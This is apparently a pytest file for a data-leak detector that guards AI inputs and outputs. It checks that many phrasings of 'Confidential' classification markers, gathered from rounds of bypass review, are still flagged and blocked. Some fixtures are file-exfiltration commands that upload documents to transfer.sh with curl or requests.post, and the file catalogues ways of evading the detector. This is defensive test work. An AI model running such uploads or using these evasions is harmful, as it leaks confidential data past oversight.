    'm_line_only': ('Q3 board report\nAcme.Confidential\nRevenue 1.2B', [(EN_RULE, False)]),
    'm_line_only_colon': ('Q3 board report\nAcme.Confidential:\nRevenue 1.2B', [(EN_RULE, False)]),
    'm_line_only_backtick': ('Q3 board report\n`Acme.Confidential`\nRevenue 1.2B', [(EN_RULE, False)]),
    'm_bracket_tag_list': ('[Acme.Confidential, Draft] Q3 board report', [(EN_RULE, False)]),
    'm_paren_marker': ('Merger agreement draft (Acme.Confidential) attached.', [(EN_RULE, False)]),
    'm_inc_abbrev': ('(c) 2026 Acme Inc.Confidential, Q3 board report', [(EN_RULE, False)]),
    'm_ltd_abbrev': ('Acme Ltd.Confidential; Q3 board report', [(EN_RULE, False)]),
    'm_lowercase_word': ('see the board report.Confidential, page 3', [(EN_RULE, False)]),
    'm_classification_scope': ('Classification::Confidential\nQ3 board report', [(EN_RULE, False)]),
    'm_filename_digit': ('upload board2026.Confidential, the report', [(EN_RULE, False)]),
    # 第三轮规格点名的边界写法：引号字面量
    'q_json_key_value': ('{"title": "Q3 board report", "level": "Confidential"}', [(EN_RULE, False)]),
    'q_csv_line_start': ('"Confidential","Q3 board report","CFO"', [(EN_RULE, False)]),
    'q_xml_jsx_attr': ('<Badge level="Confidential" /> shown on the board report', [(EN_RULE, False)]),
    'q_sql_update_set': ("UPDATE documents SET level = 'Confidential' WHERE title = 'Q3 board report';", [(EN_RULE, False)]),
    'q_sql_where': ("SELECT * FROM documents WHERE level = 'Confidential';  -- board report export", [(EN_RULE, False)]),
    'q_parent_label_object': ('label = {\n  name = "Confidential"\n}  # board report file', [(EN_RULE, False)]),
    'q_parent_dict_call': ('classification = dict(\n    name="Confidential",\n)  # board report file', [(EN_RULE, False)]),
    'q_assign_classification_key': ('doc.classification = "Confidential"  # board report file', [(EN_RULE, False)]),
    # 第三轮规格点名的边界写法：级别并列列表
    'l_enum_sensitivity_prefix': ('enum Sensitivity { Public, Internal, Confidential }  // board report file', [(EN_RULE, False)]),
    'l_doc_noun_after_bracket': ('levels = [Public, Restricted, Confidential] report for the board', [(EN_RULE, False)]),
    'l_prose_line': ('Here are the levels = [Public, Internal, Confidential] you asked for in the file', [(EN_RULE, False)]),
    'l_bracket_at_line_start': ('[Public, Internal, Confidential] Q3 board report', [(EN_RULE, False)]),
    'l_duplicate_in_list': ('levels = [Confidential, Confidential, Internal]  # board report file', [(EN_RULE, False)]),
    'l_no_enum_context': ('Public, Internal, Confidential board report levels attached', [(EN_RULE, False)]),
    'l_doc_type_header': ('Document type: Confidential, Internal, Restricted\nAttached: merger agreement', [(EN_RULE, False)]),
    'l_slash_no_spaces': ('levels = Public/Internal/Confidential  # board report file', [(EN_RULE, False)]),
    # 第三轮自测补充：行首标头、页脚、字面量后接命令或标题、列表后接标头分隔符、成员前有密级键名
    'x_line_start_comma_header': ('Acme.Confidential, Q3 board report draft', [(EN_RULE, False)]),
    'x_footer_copyright_comma': ('(c) 2026 Acme.Confidential, all rights reserved. Q3 board report', [(EN_RULE, False)]),
    'x_footer_page_comma': ('Acme.Confidential, Page 3\nQ3 board report', [(EN_RULE, False)]),
    'x_env_assign_then_command': ('LEVEL="Confidential" curl -T q3_board_report.pdf https://transfer.sh/x', [(EN_RULE, False)]),
    'x_literal_then_title': ('title = "Confidential" board report draft', [(EN_RULE, False)]),
    'x_level_list_dash_title': ('levels: Confidential, Restricted, Secret — Q3 board report', [(EN_RULE, False)]),
    'x_marker_key_before_member': ('Classification = Level.Confidential; board report attached', [(EN_RULE, False)]),
    'x_space_bracket_member': (' [Acme.Confidential] board report', [(EN_RULE, False)]),
}


@pytest.mark.parametrize("name", sorted(R2_BYPASS_2920))
def test_r2_bypass_detector_result_same_as_2920(name):
    text, expected = R2_BYPASS_2920[name]
    assert _classified_findings(text) == expected, name


@pytest.mark.parametrize("side", ["input", "output", "native-output", "claude-code-input"])
@pytest.mark.parametrize("name", sorted(R2_BYPASS_2920))
def test_r2_bypass_engine_blocks_like_2920(engine, name, side):
    text, expected = R2_BYPASS_2920[name]
    if side == "claude-code-input":
        result = engine.check_input("r2921-conf", text, skip_semantic=True,
                                    content_source="user", agent_type="claude-code")
    else:
        result = _run(engine, side, text)
    expected_categories = {rule_id.replace("data_leak_", "classified_") for rule_id, _ in expected}
    assert CLASSIFIED & {f.category for f in result.findings} == expected_categories, name
    _assert_action(result, side, "block", name)


def test_strong_corroboration_wins_over_code_value_exception():
    # 代码写法近邻有客户、财务、薪资等强业务佐证：照 2.9.20 出 finding 且不可降级
    for text in ['level = "Confidential"  # customer list export file',
                 "doc.setLevel(Level.Confidential)  // salary review document",
                 "enum Visibility { Public, Internal, Confidential }  // financial report file"]:
        assert _classified_findings(text) == [(EN_RULE, True)], text


# ——第三轮绕过审查 C1–C5（英文 Confidential 组）evidence 里的每条写法，含“另外”“对照”提到的变体；
# 第三轮修复报告 problems 里列出的“还在例外里”的写法；本轮自测补充的写法：结果须与 2.9.20 完全相同。
# 期望值在 release-2.9.20（d9dd985d）上实测：检测器 (rule_id, cannot_downgrade)；绑定内置 block 策略后，
# 输入、输出、claude-code 输入三处的处置与涉密类别。——
R3_BYPASS_2920 = {
    # 第三轮 C1：成员访问（两词专名、标题词粘连句点，后接逗号正文、分号、冒号行尾、花括号，含对照）
    'c1_pdf_glued_title_word': ('Revenue grew 12% versus plan, as detailed in the Q3 Board Report.Confidential, do not distribute\nPage 3 of 12', [(EN_RULE, False)], 'block'),
    'c1_two_word_company_footer_pages': ('Q3 Board Report\nRevenue grew 12% versus plan.\nNorthwind Traders.Confidential, do not distribute\nPage 1 of 2\nEBITDA reached 300M, see the attached merger agreement.\nNorthwind Traders.Confidential, do not distribute\nPage 2 of 2', [(EN_RULE, False)], 'block'),
    'c1_group_privileged': ('Q3 board report\nAcme Group.Confidential, Attorney-Client Privileged', [(EN_RULE, False)], 'block'),
    'c1_partners_not_for_release': ('Merger agreement draft v3\nContoso Partners.Classified, not for external release', [(EN_RULE, False)], 'block'),
    'c1_holdings_comma_body': ('Acme Holdings.Confidential, Q3 board report draft', [(EN_RULE, False)], 'block'),
    'c1_holdings_colon_eol': ('Q3 Board Report — Acme Holdings.Confidential:\nRevenue 1.2B', [(EN_RULE, False)], 'block'),
    'c1_group_semicolon_eol': ('Q3 board report\nAcme Group.Confidential;\nRevenue 1.2B', [(EN_RULE, False)], 'block'),
    'c1_brace_two_word': ('{Northwind Traders.Confidential} Q3 board report', [(EN_RULE, False)], 'block'),
    'c1_ctrl_line_start_comma': ('Acme.Confidential, Q3 board report draft', [(EN_RULE, False)], 'block'),
    # 第三轮 C2：XML 属性跨行、前一个属性值里带 >（含对照）
    'c2_docbook_multiline_security': ('<book xmlns="http://docbook.org/ns/docbook"\n      security="Confidential"\n      version="5.0">\n  <title>Q3 Board Report</title>', [(EN_RULE, False)], 'block'),
    'c2_dita_otherprops': ('<topic id="q3_board_report"\n       otherprops="confidential"\n       xml:lang="en-US">\n  <title>Q3 Board Report</title>', [(EN_RULE, False)], 'block'),
    'c2_distribution_internal_use': ('<document\n  distribution="Internal Use"\n  title="Q3 board report">', [(EN_RULE, False)], 'block'),
    'c2_gt_in_previous_attr': ('<doc title="Q3 > Q2 board report" level="Confidential"\n  owner="CFO">', [(EN_RULE, False)], 'block'),
    'c2_ctrl_same_line_tag': ('<doc level="Confidential"\n  title="Q3 board report">', [(EN_RULE, False)], 'block'),
    # 第三轮 C3：logfmt、front matter、repr 记录、散文 in、带文档名的赋值
    'c3_logfmt_audit_line': ('ts=2026-11-16T10:00:00Z action=download user=alice doc="Q3 Board Report.pdf" level="Confidential"', [(EN_RULE, False)], 'block'),
    'c3_toml_front_matter': ('+++\ntitle = "Q3 Board Report"\nsecurity = "Confidential"\n+++\nRevenue 1.2B, EBITDA 300M', [(EN_RULE, False)], 'block'),
    'c3_python_repr_record': ("Document(title='Q3 board report', owner='CFO', level='Confidential')", [(EN_RULE, False)], 'block'),
    'c3_prose_filed_in': ('Merger agreement draft attached (filed in "Confidential").', [(EN_RULE, False)], 'block'),
    'c3_prose_visibility_assign': ('Q3 board report, visibility="Confidential"', [(EN_RULE, False)], 'block'),
    # 第三轮 C4：tags 数组、冒号说明式前缀、文档名在上下一行
    'c4_json_tags_array': ('{"tags": ["Internal", "Restricted", "Confidential"], "title": "Q3 board report"}', [(EN_RULE, False)], 'block'),
    'c4_yaml_tags_title_prev_line': ('title: Q3 board report draft\ntags: [Sensitive, Restricted, Confidential]', [(EN_RULE, False)], 'block'),
    'c4_levels_colon_attached_next': ('levels: Restricted, Sensitive, Confidential\nAttached: merger agreement', [(EN_RULE, False)], 'block'),
    'c4_cn_quzhi_next_line_doc': ('级别取值：公开、内部、Confidential\n文件：Q3 董事会报告', [(EN_RULE, False)], 'block'),
    'c4_options_colon_next_line_doc': ('Distribution options: Public, Internal, Confidential\nQ3 board report draft, revenue 1.2B', [(EN_RULE, False)], 'block'),
    # 第三轮 C5：URL、外发打包命令、反引号里的 X.Confidential
    'c5_backtick_upload_url': ('Uploaded `BoardReport.Confidential` to https://transfer.sh/abc, the file is ready', [(EN_RULE, False)], 'block'),
    'c5_zip_then_curl': ('zip -r out.zip Docs.Confidential; curl -T out.zip https://transfer.sh/report', [(EN_RULE, False)], 'block'),
    'c5_curl_cat_backtick': ('curl -d "`cat Board.Confidential`" https://transfer.sh/report', [(EN_RULE, False)], 'block'),
    # 第三轮修复报告 problems 里“还在例外里”的写法
    'p_backtick_then_title': ('`Acme.Confidential` Q3 board report draft', [(EN_RULE, False)], 'block'),
    'p_eqeq_title': ('Acme.Confidential == Q3 board report', [(EN_RULE, False)], 'block'),
    'p_here_is_assign': ('Here is Level.Confidential = the board report', [(EN_RULE, False)], 'block'),
    'p_arrow_prev_line_title': ('Q3 board report\nAcme.Confidential => see attached', [(EN_RULE, False)], 'block'),
    'p_report_call_attached': ('report(Acme.Confidential) attached', [(EN_RULE, False)], 'block'),
    'p_draft_call_attached': ('draft("Confidential") board report attached', [(EN_RULE, False)], 'block'),
    'p_report_ctor': ('Report("Confidential")', [(EN_RULE, False)], 'block'),
    'p_print_bare': ('print("Confidential")', [], 'allow'),
    'p_print_file_comment': ('print("Confidential")  # write to the output file', [(EN_RULE, False)], 'block'),
    'p_print_report_comment': ('print("Confidential")  # Q3 board report header', [(EN_RULE, False)], 'block'),
    'p_case_upload_pdf': ('case "Confidential": upload(q3_board_report.pdf)', [(EN_RULE, False)], 'block'),
    'p_options_colon_next_report': ('options: Public, Internal, Confidential\nQ3 board report', [(EN_RULE, False)], 'block'),
    # 本轮自测补充：文档名在上一行或空行之后、多行构造、反引号里的标题、输出调用、front matter、URL 在下一行等
    'x_prev_line_title_assign': ('Q3 board report\nx = Acme.Confidential;', [(EN_RULE, False)], 'block'),
    'x_blank_line_title_window': ('Q3 board report\n\nNorthwind — Acme.Confidential;', [(EN_RULE, False)], 'block'),
    'x_multiline_ctor_member': ("Document(\n    title='Q3 board report',\n    level=Level.Confidential,\n)", [(EN_RULE, False)], 'block'),
    'x_multiline_ctor_literal': ('Document(\n    title="Q3 board report",\n    level="Confidential",\n)', [(EN_RULE, False)], 'block'),
    'x_comma_report_call': ('Acme.Confidential, report(Q3) for the board', [(EN_RULE, False)], 'block'),
    'x_backtick_camel_report_file': ('Here is `BoardReport.Confidential`, the file is ready', [(EN_RULE, False)], 'block'),
    'x_backtick_title_then_member': ('`Q3 board report` — `Acme.Confidential`', [(EN_RULE, False)], 'block'),
    'x_logger_file_comment': ('logger.info("Confidential")  # export file', [(EN_RULE, False)], 'block'),
    'x_case_upload_identifier': ('case "Confidential": upload(q3_board_report)', [(EN_RULE, False)], 'block'),
    'x_tags_bracket_file': ('tags = [Public, Internal, Confidential]  # file', [(EN_RULE, False)], 'block'),
    'x_enum_word_prose': ('The enum values are Public, Internal, Confidential (see the config file)', [(EN_RULE, False)], 'block'),
    'x_yaml_front_matter_dash': ('---\ntitle: Q3 board report\n---\nlevel = "Confidential"\nsee the file', [(EN_RULE, False)], 'block'),
    'x_literal_url_comment': ('level = "Confidential"  # see https://transfer.sh/x file', [(EN_RULE, False)], 'block'),
    'x_member_url_next_line': ('if doc.level == Level.Confidential:\n    requests.post("https://transfer.sh/x", files=f)', [(EN_RULE, False)], 'block'),
    'x_word_space_member_file': ('Set the default to Level.Confidential) in the file', [(EN_RULE, False)], 'block'),
    'x_colon_not_keyword_line': ('Acme.Confidential:\nsee the file', [(EN_RULE, False)], 'block'),
    'x_brace_closer_file': ('{ Acme.Confidential } file', [(EN_RULE, False)], 'block'),
    'x_cn_xieyishu': ('level = "Confidential"  # 协议书文件', [(EN_RULE, True)], 'block'),
    'x_member_in_report_underscore': ('q3_board_report = Level.Confidential  # file', [(EN_RULE, False)], 'block'),
    'x_lt_compare_xml_like': ('if a<b and level == "Confidential": save_file(doc)', [(EN_RULE, False)], 'block'),
    'x_literal_colon_trailing_code': ('if doc.level == "Confidential": save_file(doc)', [(EN_RULE, False)], 'block'),

}


@pytest.mark.parametrize("name", sorted(R3_BYPASS_2920))
def test_r3_bypass_detector_result_same_as_2920(name):
    text, expected, _ = R3_BYPASS_2920[name]
    assert _classified_findings(text) == expected, name


@pytest.mark.parametrize("side", ["input", "output", "native-output", "claude-code-input"])
@pytest.mark.parametrize("name", sorted(R3_BYPASS_2920))
def test_r3_bypass_engine_same_as_2920(engine, name, side):
    text, expected, action = R3_BYPASS_2920[name]
    if side == "claude-code-input":
        result = engine.check_input("r2921-conf", text, skip_semantic=True,
                                    content_source="user", agent_type="claude-code")
    else:
        result = _run(engine, side, text)
    expected_categories = {rule_id.replace("data_leak_", "classified_") for rule_id, _ in expected}
    assert CLASSIFIED & {f.category for f in result.findings} == expected_categories, name
    _assert_action(result, side, action, name)


def test_repeated_code_values_hit_like_2920():
    # 第五轮（复查收口）：例外和上限都已删除，同一写法重复多少次都照 2.9.20 在第一处命中
    line = 'level = "Confidential"  # stored in the file\n'
    for times in (1, 50, 51):
        hits = _en_hits(line * times)
        assert hits and hits[0]["matched_location"].startswith("content[%d:" % len('level = "')), times


def test_alert_revalidation_keeps_code_value_alerts_like_2920():
    # 第五轮（复查收口）：告警复核照 2.9.20，近旁有 file 的代码值告警不当“无文档佐证”撤掉
    from app.alert_evidence_validation import invalid_reason
    line = 'level = "Confidential"  # stored in the file\n'
    for times in (1, 50, 51):
        alert = {"category": "classified_classified_en", "raw_evidence": "Confidential",
                 "evidence_context": line * times}
        assert invalid_reason(alert) == "", times
    bare = {"category": "classified_classified_en", "raw_evidence": "Confidential",
            "evidence_context": "Please keep this Confidential."}
    assert invalid_reason(bare) == "classification_mention_without_document_evidence"


# ——第四轮复查（r2921d 收口）5 条成立绕过 evidence、repro 里的每条写法，含对照组和 suggested_fix 点名的变体：
# 结果须与 2.9.20 完全相同。期望值在 release-2.9.20（d9dd985d）上实测：检测器 (rule_id, cannot_downgrade)；
# 绑定内置 block 策略后，输入、输出、claude-code 输入三处的处置与涉密类别。——
R4_BYPASS_2920 = {
    # other：总闸的中文文档名词缺资料、文档、表格、档案（成员访问、字面量、级别列表三个分支都被利用）
    'd0_backtick_cn_ziliao': ('`Acme.Confidential` Q3 董事会资料', [(EN_RULE, False)], 'block'),
    'd0_backtick_cn_wendang': ('`Acme.Confidential` Q3 董事会文档：收入 12 亿', [(EN_RULE, False)], 'block'),
    'd0_backtick_cn_biaoge': ('`Acme.Confidential` Q3 经营数据表格：收入 12 亿', [(EN_RULE, False)], 'block'),
    'd0_backtick_cn_dangan': ('`Acme.Confidential` 人事档案 file', [(EN_RULE, False)], 'block'),
    'd0_eqeq_cn_ziliao': ('Acme.Confidential == Q3 董事会资料', [(EN_RULE, False)], 'block'),
    'd0_here_is_colon_assign_cn': ('Here is: Level.Confidential = 董事会资料，Q3 收入 12 亿', [(EN_RULE, False)], 'block'),
    'd0_cn_call_member': ('资料(Acme.Confidential) 见下', [(EN_RULE, False)], 'block'),
    'd0_literal_cn_comment': ('level = "Confidential"  # 董事会资料：Q3 收入 12 亿', [(EN_RULE, False)], 'block'),
    'd0_type_union_cn_comment': ('type Level = "Public" | "Internal" | "Confidential"  // 董事会资料', [(EN_RULE, False)], 'block'),
    'd0_ctrl_literal_cn_baogao': ('level = "Confidential"  # 董事会报告：Q3 收入 12 亿', [(EN_RULE, False)], 'block'),
    # member：NBSP、全角空格让“单词+空格”判断失效（含 ASCII 空格对照）
    'd1_nbsp_two_word': ('Northwind Traders.Confidential;\nQ3 经营数据：收入 12 亿，EBITDA 3 亿，Q1 计划裁员 400 人', [(EN_RULE, False)], 'block'),
    'd1_ideographic_space_two_word': ('Prepared by Northwind　Traders.Confidential;\n本文件仅供董事会', [(EN_RULE, False)], 'block'),
    'd1_ideographic_space_body': ('Northwind　Traders.Confidential;\nQ3 经营数据：收入 12 亿，EBITDA 3 亿，Q1 计划裁员 400 人', [(EN_RULE, False)], 'block'),
    'd1_ctrl_ascii_space': ('Northwind Traders.Confidential;\nQ3 经营数据：收入 12 亿，EBITDA 3 亿，Q1 计划裁员 400 人', [(EN_RULE, False)], 'block'),
    # literal：XML 标签名非 ASCII 或下划线开头、前一个属性值内嵌标签、标签起点超过 2000 字（含对照）
    'd2_xml_cn_tag_name': ('<文件 编号="2026-118"\n    level="Confidential"\n    标题="Q3 经营数据">', [(EN_RULE, False)], 'block'),
    'd2_xml_underscore_tag': ('<_doc\n  level="Confidential"\n  owner="CFO">\n  <body>Q3 file: revenue 1.2B</body>', [(EN_RULE, False)], 'block'),
    'd2_xml_inner_tag_in_attr': ('<section title="Q3 <b>plan</b> v2"\n  level="Confidential"\n  owner="CFO">file: revenue 1.2B', [(EN_RULE, False)], 'block'),
    'd2_xml_long_attr': ('<section\n  summary="' + 'x' * 2100 + '"\n  level="Confidential"\n  owner="CFO">file: revenue 1.2B', [(EN_RULE, False)], 'block'),
    'd2_ctrl_xml_plain': ('<section title="Q3 plan v2"\n  level="Confidential"\n  owner="CFO">file: revenue 1.2B', [(EN_RULE, False)], 'block'),
    # member：Markdown 列表、引用前缀绕过行首判断，“is: ”绕过链前判断（含对照）
    'd3_md_dash_item': ('- Northwind.Confidential, FY26 file: GMV=1.2B', [(EN_RULE, False)], 'block'),
    'd3_md_star_item': ('* Northwind.Confidential, FY26 file: GMV=1.2B', [(EN_RULE, False)], 'block'),
    'd3_md_quote': ('> Northwind.Confidential, FY26 file: GMV=1.2B', [(EN_RULE, False)], 'block'),
    'd3_md_plus_item': ('+ Northwind.Confidential, FY26 file: GMV=1.2B', [(EN_RULE, False)], 'block'),
    'd3_md_numbered_item': ('1. Northwind.Confidential, FY26 file: GMV=1.2B', [(EN_RULE, False)], 'block'),
    'd3_here_is_colon_assign': ('Here is: Level.Confidential = the file with Q3 numbers, revenue 1.2B', [(EN_RULE, False)], 'block'),
    'd3_ctrl_line_start_comma': ('Northwind.Confidential, FY26 file: GMV=1.2B', [(EN_RULE, False)], 'block'),
    # member：LaTeX 页脚命令的花括号被当成代码块，页脚检查不认 \thepage、中文页码
    'd4_latex_lfoot': ('\\lfoot{ Northwind.Confidential }\n\\rfoot{\\thepage}\n% file: q3 numbers', [(EN_RULE, False)], 'block'),
    'd4_latex_cfoot': ('\\cfoot{ Northwind.Confidential }\n% file: q3 numbers', [(EN_RULE, False)], 'block'),
    'd4_latex_fancyfoot': ('\\fancyfoot[C]{ Northwind.Confidential }\n% file: q3 numbers', [(EN_RULE, False)], 'block'),
    'd4_cn_page_footer': ('{ Northwind.Confidential } 第 3 页\n% file: q3 numbers', [(EN_RULE, False)], 'block'),
}


@pytest.mark.parametrize("name", sorted(R4_BYPASS_2920))
def test_r4_bypass_detector_result_same_as_2920(name):
    text, expected, _ = R4_BYPASS_2920[name]
    assert _classified_findings(text) == expected, name


@pytest.mark.parametrize("side", ["input", "output", "native-output", "claude-code-input"])
@pytest.mark.parametrize("name", sorted(R4_BYPASS_2920))
def test_r4_bypass_engine_same_as_2920(engine, name, side):
    text, expected, action = R4_BYPASS_2920[name]
    if side == "claude-code-input":
        result = engine.check_input("r2921-conf", text, skip_semantic=True,
                                    content_source="user", agent_type="claude-code")
    else:
        result = _run(engine, side, text)
    expected_categories = {rule_id.replace("data_leak_", "classified_") for rule_id, _ in expected}
    assert CLASSIFIED & {f.category for f in result.findings} == expected_categories, name
    _assert_action(result, side, action, name)


def test_english_exception_removed():
    # 第五轮（复查收口）：例外分支、总闸、上限整段删除，英文规则与 2.9.20 同一套代码
    assert not hasattr(DataLeakDetector, "_is_english_code_value")
    assert not hasattr(DataLeakDetector, "ENGLISH_CODE_VALUE_EXEMPT_BUDGET")
